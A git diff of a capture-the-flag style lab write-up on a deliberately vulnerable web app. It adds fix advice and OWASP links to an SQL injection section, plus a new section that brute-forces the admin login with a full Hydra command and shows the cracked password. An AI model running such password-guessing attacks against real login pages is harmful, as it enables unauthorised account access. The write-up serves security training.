@@ -1,5 +1,7 @@
 # SQLI Credentials
 
+### Breach Exploit
+
 From /?page=member we have an sql injection where we can dump all the db:
 
 ```
@@ -135,3 +137,30 @@ shadow      (?)
 ```
 
 Use the credentials to fill the signin page and we get the flag.
+
+### Fix Breach
+Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL.
+```https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html```
+
+### Documentation
+```https://owasp.org/www-community/attacks/SQL_Injection```
+
+
+# Brute_force_attack
+
+### Breach Exploit
+From http://x.x.x.x/?page=signin&username=admin&password=&Login=Login# we try to brute force the login
+
+Using Hydra and 10k most common password: 
+ Hydra v9.0 run at 2023-10-26 19:12:58 on 192.168.56.101 http-get-form (hydra -l admin -P 10kpassword.txt -F -o hydra.log x.x.x.x http-get-form /index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif)
+```[80][http-get-form] host: 192.168.56.101   login: admin   password: shadow```
+
+### Fix Breach
+To prevent this:
+-Detect brute force attempt and ban the address it's comming from 
+-Add a captcha
+-Add delay between login attempt to slow down
+-Force users to use a strong enough password
+
+### Documentation
+```https://owasp.org/www-community/attacks/Brute_force_attack```
